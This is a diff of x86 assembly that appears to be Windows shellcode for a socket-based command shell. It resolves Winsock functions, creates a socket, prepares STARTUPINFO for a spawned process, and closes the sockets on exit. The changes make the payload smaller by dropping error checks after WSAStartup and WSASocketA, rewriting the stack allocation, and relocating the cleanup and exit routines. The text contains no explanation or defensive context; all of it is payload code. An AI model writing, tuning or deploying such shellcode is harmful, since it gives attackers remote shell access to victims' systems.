@@ -317,7 +317,10 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -512    
+    xor    edx, edx
+    mov    dh, 2
+    dec    eax    
+    sub    esp, edx 
     push   esp
     pop    edi
     
@@ -334,8 +337,6 @@ rc_l2:
     push   edi         ; &wsa
     push   2           ; MAKEWORD(2, 0)
     callx  "ws2_32.dll", "WSAStartup", 2
-    test   eax, eax
-    jnz    xit
     
     ; WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
     push   eax         ; 0
@@ -345,8 +346,6 @@ rc_l2:
     push   1           ; SOCK_STREAM
     push   2           ; AF_INET 
     callx  "ws2_32.dll", "WSASocketA", 6
-    test   eax, eax
-    js     xit
     
     xchg   eax, ebx    ; ebx = s
 
@@ -383,7 +382,22 @@ rc_l2:
     js     cls_s
     
     xchg   eax, esi
-    
+    jmp    init_si
+cls_r:
+    ; closesocket (r);
+    push   esi 
+    callx  "ws2_32.dll", "closesocket", 1           
+cls_s:
+    push   ebx
+    ; closesocket (s);
+    callx  "ws2_32.dll", "closesocket", 1     
+exit_code:
+    xor    edx, edx
+    mov    dh, 2  
+    dec    eax    
+    add    esp, edx
+    ret    
+init_si:    
     ; initialize STARTUPINFO
     ; here is where it gets a bit tricky
     push   104
@@ -463,15 +477,4 @@ rc_l10x:
     scasd
     push   dword[edi]  
     callx  "kernel32.dll", "CloseHandle", 1    
-cls_r:
-    ; closesocket (r);
-    push   esi 
-    callx  "ws2_32.dll", "closesocket", 1           
-cls_s:
-    push   ebx
-    ; closesocket (s);
-    callx  "ws2_32.dll", "closesocket", 1 
-xit:    
-    sub    esp, -512
-    ;mov eax, [fs:0x34]
-    ret    
+    jmp    cls_r
